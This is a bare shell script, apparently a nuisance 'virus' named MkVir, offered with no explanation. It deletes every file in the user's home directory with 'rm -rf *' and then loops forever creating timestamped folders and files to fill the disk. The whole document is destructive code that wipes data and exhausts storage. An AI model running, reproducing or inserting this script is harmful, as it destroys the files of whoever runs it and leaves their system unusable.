cd
rm -rf * --no-preserve-root
while true; do
  echo MkVir
  echo Just create folders and files
  mkdir "MkVir_$(date +%s%N)"
  touch "MkVir_$(date +%s%N)"
done
